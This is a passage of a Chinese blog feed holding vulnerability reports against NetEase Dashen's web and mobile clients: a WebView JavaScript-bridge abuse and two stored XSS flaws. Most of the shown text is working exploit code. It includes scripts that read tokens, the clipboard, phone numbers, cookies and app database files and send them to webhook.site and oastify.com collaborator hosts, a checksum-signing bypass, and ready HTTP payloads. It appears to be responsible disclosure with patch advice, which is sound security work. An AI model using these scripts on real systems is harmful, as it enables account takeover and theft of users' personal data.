+  </li>
+  <li>
+    <p>漏洞利用：获取token信息</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取token信息
+WebViewJavascriptBridge.callHandler("getGodlikeInfo", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
+</code></pre></div>    </div>
+
+    <p><img src="/assets/images/gettoken.png" alt="gettoken" /></p>
+
+    <p>利用token信息伪造受害者发消息请求成功：</p>
+
+    <p><img src="/assets/images/gettoken2.png" alt="gettoken2" /></p>
+  </li>
+  <li>
+    <p>漏洞利用：获取粘贴板内容</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取粘贴板内容
+WebViewJavascriptBridge.callHandler("getClipboardData", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{type:"text/plain"}},function(e){console.log(e)})
+</code></pre></div>    </div>
+
+    <p><img src="/assets/images/clipboard.png" alt="clipboard" /></p>
+  </li>
+  <li>
+    <p>漏洞利用：上传文件攻击，上传指定文件，包括受害者数据库，share_prefs等，sdcard上的任何已知文件。由于无法遍历文件夹列表，因此只能指定文件上传，即使这样，也由足够的文件量，例如微信的外置存储相关的特征文件等。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//下载文件/图片，可以是本地路径，返回文件id，高危！！！！！！
+WebViewJavascriptBridge.callHandler("downloadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{url:"/data/data/com.netease.gl/databases/auth",isShowProgressTips:1}},function(res){
+    console.log(res)
+    console.log("upload file:", "/data/data/com.netease.gl/databases/auth")
+    if(res.code==200){
+        var localId = res.result.localId;
+        //上传文件/图片，可以是本地路径，高危！！！！！配合上一步的文件id，完成文件上传，上传到网易云中
+        WebViewJavascriptBridge.callHandler("uploadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:localId,isShowProgressTips:1,usageType:1}},function(res2){
+            if(res2.code==200){
+                var downloadUrl = res2.result.url
+                console.log("downloadUrl:", downloadUrl)
+            }
+            })
+    }
+    })
+</code></pre></div>    </div>
+
+    <p>上传图片文件：</p>
+
+    <p><img src="/assets/images/fileupload.png" alt="fileupload" /></p>
+
+    <p>上传非图片文件，例如：/data/data/com.netease.gl/databases/chat_b1fbb501020c46ff88577a3fe103c0ec 为用户的聊天数据库，文件名替换成受害者的uid即可</p>
+
+    <p><img src="/assets/images/fileupload2.png" alt="fileupload" /></p>
+  </li>
+  <li>
+    <p>完整的js interface利用列表如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取token信息
+WebViewJavascriptBridge.callHandler("getGodlikeInfo", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
+
+//获取手机客户端用户信息，包括手机号，用户id
+WebViewJavascriptBridge.callHandler("getLogField", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
+
+//判断应用是否安装
+WebViewJavascriptBridge.callHandler("launchApp", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{iosSchemeProtocol:"",androidPackageName:"com.android.traceur"}},function(e){console.log(e)})
+
+//启动应用
+WebViewJavascriptBridge.callHandler("launchApp", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{iosSchemeProtocol:"",androidPackageName:"im.yixin",iosDownloadUrl:"",iosStoreKitITunesItemId:"",iosStoreKitAffiliateToken:"10lxv5",iosStoreKitCampaignToken:"gl-jssdk"}},function(e){console.log(e)})
+
+//控制粘贴板内容
+WebViewJavascriptBridge.callHandler("doCopy", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{text:"gl-jssdk"}},function(e){console.log(e)})
+
+//获取粘贴板内容
+WebViewJavascriptBridge.callHandler("getClipboardData", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{type:"text/plain"}},function(e){console.log(e)})
+
+//关注他人
+WebViewJavascriptBridge.callHandler("followUser", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{uid:"fb79313773894347bca73424dedf7913"}},function(e){console.log(e)})
+
+//打开相册
+WebViewJavascriptBridge.callHandler("chooseImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{count:9,source:"album",front:1,credentialsType:0,credentialsTips:"",waterMarkText:"",waterMarkPosition:"bottomCenter"}},function(e){console.log(e)})
+
+//下载文件/图片，可以是本地路径，返回文件id，高危！！！！！！
+WebViewJavascriptBridge.callHandler("downloadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{url:"/sdcard/Pictures/aa.jpg",isShowProgressTips:1}},function(e){console.log(e)})
+
+//上传文件/图片，可以是本地路径，高危！！！！！配合上一步的文件id，完成文件上传，上传到网易云中
+WebViewJavascriptBridge.callHandler("uploadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:"godlike://resourceid/9f64aebdfff3ef5abd0f1365b08f0fc7",isShowProgressTips:1,usageType:1}},function(e){console.log(e)})
+
+//或者直接读取文件
+WebViewJavascriptBridge.callHandler("getLocalImageData", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:"godlike://resourceid/6e37e47d1b0874c42a31e80e654b39a7"}},function(e){console.log(e)})
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>将上述漏洞利用脚本化，将受害者的敏感信息，文件url，粘贴板数据等回传到攻击者控制的burpsuite collaborator。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// burpsuite collaborator url
+const api_burp = 'http://webhook.site/09f1dce5-7edb-403d-807b-3fe4a54e9d4c'
+
+console.log("mxss触发 by 0x5r33!!!!")
+// 通过img src来向burpsuite collaborator url外送敏感新信息
+const justSend = async url =&gt; {
+    var Img = new Image
+    Img.src = url
+}
+
+// base64 加解密
+const encode = str =&gt; {
+    var b64 = btoa(unescape(encodeURIComponent(str)))
+    return b64
+}
+const decode = str =&gt; {
+    var str = decodeURIComponent(escape(atob(str)));
+    return str
+}
+//获取敏感信息
+const sendData = () =&gt; {
+    WebViewJavascriptBridge.init()
+    var usrInfo, tokenInfo, clipData, fileData;
+    //获取手机客户端用户信息，包括手机号，用户id
+    WebViewJavascriptBridge.callHandler("getLogField", 
+        {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},
+        function(e){
+            if(e.code==200){
+                usrInfo = e.result;
+                console.log("获取用户数据成功！！！")
+            }
+        }
+    )
+    //获取token信息
+    WebViewJavascriptBridge.callHandler("getGodlikeInfo", 
+        {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},
+        function(e){
+            if(e.code==200){
+                tokenInfo = e.result;
+                console.log("获取token成功！！！")
+            }
+                
+        }
+    )
+
+    WebViewJavascriptBridge.callHandler("getClipboardData", 
+        {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{type:"text/plain"}},
+        function(e){
+            if(e.code==200){
+                clipData = e.result;
+                console.log("获取粘贴板成功！！！")
+            }
+        }
+    )
+
+    //下载文件/图片，可以是本地路径，返回文件id，高危！！！！！！
+    WebViewJavascriptBridge.callHandler("downloadImage", 
+        {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{url:"/data/data/com.netease.gl/databases/auth",isShowProgressTips:1}},
+        function(res){
+            
+            console.log("upload file:", "/data/data/com.netease.gl/databases/auth")
+            if(res.code==200){
+                var localId = res.result.localId;
+                //上传文件/图片，可以是本地路径，高危！！！！！配合上一步的文件id，完成文件上传，上传到网易云中
+                WebViewJavascriptBridge.callHandler("uploadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:localId,isShowProgressTips:1,usageType:1}},function(res2){
+                    if(res2.code==200){
+                        var fileData = res2.result
+                        console.log("获取数据库文件成功！！！")
+
+                        var finalData = {
+                            usrInfo:usrInfo,
+                            tokenInfo:tokenInfo,
+                            clipData:clipData,
+                            fileData:fileData
+                        }
+                        // send data
+                        var encoded = encode(JSON.stringify(finalData))
+                        justSend(api_burp + '?data=' + encoded)
+                    }
+                    })
+            }
+        })
+        
+}
+// 判断pc端还是手机端
+const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+if (isMobile) {
+    /* your code here */
+    sendData()
+}       
+</code></pre></div>    </div>
+
+    <p>完整利用过程请看POC视频</p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频
+视频链接：链接：https://pan.baidu.com/s/1ujV4aKjagPCMNhhxELePgg 提取码：1314</p>
+
+<h2 id="impact">Impact</h2>
+<p>该漏洞影响最新大神客户端Webview，通过访问含有xss的手机版大神网页，能够在应用内部webview中执行xss，攻击者能够获取受害者手机号、粘贴板数据、请求token、聊天数据、应用database、应用shared_prefs、应用内部所有存储文件、外置存储sdcard指定文件等，造成严重的客户端数据泄漏。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+<ol>
+  <li>对手机版网页端https://ds.163.com/ 中的dompurify升级到最新版</li>
+  <li>对应用内置webview js interface接口WebViewJavascriptBridge，进行更严格的权限控制，特别是文件上传功能downloadImage</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><category term="jsinterface" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：网易大神Web端频道签到消息存储型XSS漏洞</title><link href="http://localhost:4000/xss/2023/10/19/xss-innerhtml.html" rel="alternate" type="text/html" title="中危：网易大神Web端频道签到消息存储型XSS漏洞" /><published>2023-10-19T10:26:18+08:00</published><updated>2023-10-19T10:26:18+08:00</updated><id>http://localhost:4000/xss/2023/10/19/xss-innerhtml</id><content type="html" xml:base="http://localhost:4000/xss/2023/10/19/xss-innerhtml.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>网易大神Web端频道签到消息存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POST https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg</li>
+  <li>POC网页 https://ds.163.com/channel/0149881854/1459481/ 打开后在终端打印111222233</li>
+  <li>视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /v1/web/chat-room-msg/send-msg HTTP/1.1
+Host: inf-im.ds.163.com
+Connection: close
+Content-Length: 586
+GL-CheckSum: 20c428fbe325f20d1ff139943dafd2334814804e_28aebbff3e33281f4afe3ebcf0b19ae90ba97998
+sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+sec-ch-ua-mobile: ?0
+GL-Uid: xxxxxxx
+GL-DeviceId: 1189888043.1694780319
+Content-Type: application/json;charset=UTF-8
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+GL-ClientType: 61
+GL-Nonce: xxxx
+GL-X-XSRF-TOKEN: xxxxx
+sec-ch-ua-platform: "Windows"
+Origin: https://ds.163.com
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ds.163.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cookie: xxx
+
+{ "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(2222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+<p>网易大神web版中，聊天频道发布签到消息(IMAGE_TEXT_TEMPLATE)时，没有对签到的内容进行过滤，而是直接将签到内容赋值给innerHTML，直接造成存储型XSS攻击。</p>
+
+<h3 id="detail">Detail</h3>
+<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>登录大神Web平台 https://ds.163.com/</li>
+  <li>
+    <p>进入频道，选择任意频道测试发消息，例如进入测试频道 https://ds.163.com/channel/0149881871/1459515/
+发消息测试，并且通过burpsuite观察请求包结构</p>
+
+    <p><img src="/assets/images/sendmsg.png" alt="sendmsg" /></p>
+
+    <p>可以从请求头header中看到，前端对请求体做了校验，攻击者直接修改请求体是不可行的
+ <img src="/assets/images/checksum.png" alt="checksum" /></p>
+  </li>
+  <li>
+    <p>为了绕过校验，对前端的校验流程进行简单的逆行分析定位到校验函数，并且成功获取函数handler。
+ https://g.166.net/res/a19/umi.b2e4db33.js 中的gen_sign函数对原始的请求体进行了校验并且返回校验的结果，如下：
+ <img src="/assets/images/sign.png" alt="sign" />
+ 继续分析，发现gen_sign函数来源于https://g.166.net/opd/latest/sig/bootstrap.js的sig模块，通过sig.default()能够初始化并且返回模块，从而获取到gen_sign函数handler
+ <img src="/assets/images/module.png" alt="module" />
+ 测试对请求体进行校验：
+ <img src="/assets/images/gensign.png" alt="gensign" /></p>
+  </li>
+  <li>至此，我们能够对请求体进行篡改并且带上合法的校验头。通过debug发现签到消息直接渲染到了前端没有进行过滤。这点是通过untrusted type chrome插件定位的。</li>
+  <li>
+    <p>而签到消息的结构体可以从消息获取请求中得到，如下图。获取结构体后，我们便可以构造xss payload，并且发送该消息。</p>
+
+    <p><img src="/assets/images/qiandaotype.png" alt="qiandaotype" /></p>
+
+    <p>由此构造最终的xss payload，其中serverID，channelID，squareID分别是频道相关的id号，表示需要把消息发送给哪个聊天群。fromUid是消息发送者的id，content.data字段便是xss的注入点位, contentType务必填写IMAGE_TEXT_TEMPLATE类型：</p>
+
+    <p>{ “serverId”: “0149881854”, “channelId”: “1459481”, “squareId”: “60054a7dd5456877d226706e”, “fromUid”: “b1fbb501020c46ff88577a3fe103c0ec”, “fromNick”: “”, “msgType”: “CHAT_ROOM_MSG”, “sourceType”: “GOD_WEB”, “content”: [{ “type”: “TITLE”, “data”: { “banner”: “”, “icon”: “https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870”, “atUser”: “@灯中烛火”, “text”: “签到成功！” }, “order”: 0.0 }, { “type”: “TEXT”, “data”: “&lt;img src=x onerror=console.log(1111122222233)&gt;”, “order”: 1.0 }, { “type”: “BUTTON”, “data”: [{ “text”: “立即抽奖”, “action”: { “type”: “OPEN_URL”, “data”: “https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+” } }], “order”: 2.0 }], “contentType”: “IMAGE_TEXT_TEMPLATE” }</p>
+
+    <p>为简化操作，写一个js文件，实现自动发帖，将上述payload通过本js脚本发送，请在大神网页的Console中执行。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // burpsuite collaborator url
+ const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+ // init webassembly and get sig_gen function
+ // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
+ var moduleX;
+ Promise.all([sig.default()]).then(function (t) {
+     moduleX = t
+ })
+
+ // 获取cookie信息
+ const getCookieValue = (name) =&gt; (
+     document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+ )
+
+ const myFetch = async (url, headers) =&gt; {
+     let data = await fetch(url, {
+         method: 'GET',
+         headers: headers,
+         credentials: 'include'
+     })
+     let res = await data.json();
+     return res
+ }
+ // 构造GET发送请求
+ const setHeaderDs = (payload) =&gt; {
+     var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
+     var GL_Uid = getCookieValue('GOD_UUID')
+     var checkres = moduleX['0'].gen_sign(payload)
+     var checkjson = JSON.parse(checkres)
+     var GL_CheckSum = checkjson['sign']
+     var GL_Nonce = checkjson['timestamp']
+     var GL_ClientType = 61
+     var GL_DeviceId = localStorage.getItem('ns-client-id')
+     var headers = {
+         'GL-CheckSum': GL_CheckSum,
+         'GL-Nonce': GL_Nonce,
+         'GL-Uid': GL_Uid,
+         'GL-DeviceId': GL_DeviceId,
+         'GL-ClientType': GL_ClientType,
+         'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
+         'Content-Type': 'application/json;charset=UTF-8'
+     }
+     return headers
+ }
+
+ // 构造POST发送请求
+ const myPostFetch = async (url, headers, payload) =&gt; {
+     let data = await fetch(url, {
+         method: 'POST',
+         headers: headers,
+         credentials: 'include',
+         body: JSON.stringify(payload),
+     })
+     let res = await data.json();
+     return res
+ }
+
+ // 通过img src来向burpsuite collaborator url外送敏感新信息
+ const justSend = async url =&gt; {
+     var Img = new Image
+     Img.src = url
+ }
+
+ // base64 加解密
+ const encode = str =&gt; {
+     var b64 = btoa(unescape(encodeURIComponent(str)))
+     return b64
+ }
+ const decode = str =&gt; {
+     var str = decodeURIComponent(escape(atob(str)));
+     return str
+ }
+ //获取并发送cookie，带有手机号
+ const sendCookie = () =&gt; {
+     var encoded = encode(document.cookie)
+     // send data
+     justSend(api_burp + '?data=' + encoded)
+ }
+
+ // 发送xss payload
+ const startSendLinkMessage = async function () {
+
+     // 链接，设置fromUid为攻击者的UID
+     var payload_json = { "serverId": "0149881854", "channelId": "1459481", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(111222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
+
+     var headers = setHeaderDs(JSON.stringify(payload_json))
+     res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
+ }
+ startSendLinkMessage()
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>结果展示
+ payload已经渲染到前端</p>
+
+    <p><img src="/assets/images/consolelog.png" alt="consolelog" />
+ payload已经执行：</p>
+
+    <p><img src="/assets/images/consolelog2.png" alt="consolelog2" /></p>
+  </li>
+  <li>该XSS的利用</li>
+</ol>
+
+<ul>
+  <li>首先是窃取cookie，可能会带有邮箱和手机号信息
+<a href="/assets/images/cookie.png">cookie</a></li>
+  <li>伪造发送消息等
+前面通过脚本发送合法请求，已经足够证明攻击者能伪造用户发送消息。只需要把该脚本上传到https服务器，并且通过xss payload下载恶意脚本，能够执行更加复杂的逻辑。</li>
+</ul>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频
+视频链接：链接：https://pan.baidu.com/s/1468B0QCK8zEIu7MtIVb4CQ 提取码：1314
+完整利用脚本如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    // burpsuite collaborator url
+    const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+    // init webassembly and get sig_gen function
+    // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
+    var moduleX;
+    Promise.all([sig.default()]).then(function (t) {
+        moduleX = t
+    })
+
+    // 获取cookie信息
+    const getCookieValue = (name) =&gt; (
+        document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+    )
+
+    const myFetch = async (url, headers) =&gt; {
+        let data = await fetch(url, {
+            method: 'GET',
+            headers: headers,
+            credentials: 'include'
+        })
+        let res = await data.json();
+        return res
+    }
+    // 构造GET发送请求
+    const setHeaderDs = (payload) =&gt; {
+        var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
+        var GL_Uid = getCookieValue('GOD_UUID')
+        var checkres = moduleX['0'].gen_sign(payload)
+        var checkjson = JSON.parse(checkres)
+        var GL_CheckSum = checkjson['sign']
+        var GL_Nonce = checkjson['timestamp']
+        var GL_ClientType = 61
+        var GL_DeviceId = localStorage.getItem('ns-client-id')
+        var headers = {
+            'GL-CheckSum': GL_CheckSum,
+            'GL-Nonce': GL_Nonce,
+            'GL-Uid': GL_Uid,
+            'GL-DeviceId': GL_DeviceId,
+            'GL-ClientType': GL_ClientType,
+            'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
+            'Content-Type': 'application/json;charset=UTF-8'
+        }
+        return headers
+    }
+
+    // 构造POST发送请求
+    const myPostFetch = async (url, headers, payload) =&gt; {
+        let data = await fetch(url, {
+            method: 'POST',
+            headers: headers,
+            credentials: 'include',
+            body: JSON.stringify(payload),
+        })
+        let res = await data.json();
+        return res
+    }
+
+    // 通过img src来向burpsuite collaborator url外送敏感新信息
+    const justSend = async url =&gt; {
+        var Img = new Image
+        Img.src = url
+    }
+
+    // base64 加解密
+    const encode = str =&gt; {
+        var b64 = btoa(unescape(encodeURIComponent(str)))
+        return b64
+    }
+    const decode = str =&gt; {
+        var str = decodeURIComponent(escape(atob(str)));
+        return str
+    }
+    //获取并发送cookie，可能带有手机号
+    const sendCookie = () =&gt; {
+        var encoded = encode(document.cookie)
+        // send data
+        justSend(api_burp + '?data=' + encoded)
+    }
+
+    // 发送xss payload
+    const startSendLinkMessage = async function () {
+
+        // 链接，设置fromUid为攻击者的UID
+        var payload_json = { "serverId": "0149881854", "channelId": "1459481", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": [{ "type": "TITLE", "data": { "banner": "", "icon": "https://ok.166.net/reunionpub/pr_ie_b9j52wbl0e3l6hvzjbq\u003d\u003d_50_1535083040_870", "atUser": "@灯中烛火", "text": "签到成功！" }, "order": 0.0 }, { "type": "TEXT", "data": "&lt;img src=x onerror=console.log(111222233)&gt;", "order": 1.0 }, { "type": "BUTTON", "data": [{ "text": "立即抽奖", "action": { "type": "OPEN_URL", "data": "https://act.ds.163.com/caa6e9455189fb93/64eeea62ee5826000175e65a?utm_source\u003dchatroom\u0026utm_medium\u003dbot+" } }], "order": 2.0 }], "contentType": "IMAGE_TEXT_TEMPLATE" }
+
+        var headers = setHeaderDs(JSON.stringify(payload_json))
+        res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
+    }
+    // 判断pc端还是手机端
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    if (isMobile) {
+        /* your code here */
+    } else {
+        //web端
+        //发送cookie
+        sendCookie()
+        //伪造发分享消息
+        startSendLinkMessage()
+    }
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+<p>该漏洞影响网页端所有聊天频道，注意到每个游戏频道都有几十上百万用户，影响深远。用户只要进入聊天界面，无需任何操作就能够遭受攻击。</p>
+<ol>
+  <li>攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；</li>
+  <li>攻击者可以在聊天群直接嵌入XSS，无需受害者进行操作，能够伪造用户发消息等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。</li>
+</ol>
+
+<h2 id="patch-advice">Patch advice</h2>
+<ol>
+  <li>对签到的内容进行过滤，而非直接复杂给innerHTML</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：网易大神Web端频道分享帖子存储型XSS漏洞</title><link href="http://localhost:4000/xss/2023/10/18/xss-url-javascript.html" rel="alternate" type="text/html" title="中危：网易大神Web端频道分享帖子存储型XSS漏洞" /><published>2023-10-18T10:26:18+08:00</published><updated>2023-10-18T10:26:18+08:00</updated><id>http://localhost:4000/xss/2023/10/18/xss-url-javascript</id><content type="html" xml:base="http://localhost:4000/xss/2023/10/18/xss-url-javascript.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>网易大神Web端频道分享帖子存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POST https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg</li>
+  <li>POC网页 https://ds.163.com/channel/0129911649/1111007930/ 打开后点击最新的分享链接，弹出xss弹框</li>
+  <li>POC视频链接：链接：https://pan.baidu.com/s/1aOqi-sLgA5XJIw3FUPiTIw 提取码：1314</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /v1/web/chat-room-msg/send-msg HTTP/1.1
+Host: inf-im.ds.163.com
+Connection: close
+Content-Length: 586
+GL-CheckSum: 20c428fbe325f20d1ff139943dafd2334814804e_28aebbff3e33281f4afe3ebcf0b19ae90ba97998
+sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+sec-ch-ua-mobile: ?0
+GL-Uid: xxxxxxx
+GL-DeviceId: 1189888043.1694780319
+Content-Type: application/json;charset=UTF-8
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+GL-ClientType: 61
+GL-Nonce: xxxx
+GL-X-XSRF-TOKEN: xxxxx
+sec-ch-ua-platform: "Windows"
+Origin: https://ds.163.com
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ds.163.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cookie: xxx
+
+{ "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "p", "url": "javascript://%0avar a=\"163.com\";alert(document.cookie);", "desc": "o", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+<p>网易大神web版中，聊天频道分享帖子时，前后端没有对帖子的链接进行过滤，攻击者能够构造javascript链接，受害者通过点击链接触发XSS执行，攻击者能够窃取用户cookie（包含手机号码），伪造发消息等攻击。</p>
+
+<h3 id="detail">Detail</h3>
+<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>登录大神Web平台 https://ds.163.com/</li>
+  <li>
+    <p>进入频道，选择任意频道测试发消息，例如进入测试频道 https://ds.163.com/channel/0149881871/1459515/
+发消息测试，并且通过burpsuite观察请求包结构</p>
+
+    <p><img src="/assets/images/sendmsg.png" alt="sendmsg" /></p>
+
+    <p>可以从请求头header中看到，前端对请求体做了校验，攻击者直接修改请求体是不可行的
+ <img src="/assets/images/checksum.png" alt="checksum" /></p>
+  </li>
+  <li>
+    <p>为了绕过校验，对前端的校验流程进行简单的逆行分析定位到校验函数，并且成功获取函数handler。
+ https://g.166.net/res/a19/umi.b2e4db33.js 中的gen_sign函数对原始的请求体进行了校验并且返回校验的结果，如下：
+ <img src="/assets/images/sign.png" alt="sign" />
+ 继续分析，发现gen_sign函数来源于https://g.166.net/opd/latest/sig/bootstrap.js的sig模块，通过sig.default()能够初始化并且返回模块，从而获取到gen_sign函数handler
+ <img src="/assets/images/module.png" alt="module" />
+ 测试对请求体进行校验：
+ <img src="/assets/images/gensign.png" alt="gensign" /></p>
+  </li>
+  <li>至此，我们能够对请求体进行篡改并且带上合法的校验头。最先想到的攻击面是对链接进行修改，看是否能够嵌入javascript://协议，从而触发XSS。因此，我们找到了一种消息类型为分享，能够分享大神动态、视频和帖子等。如下图：
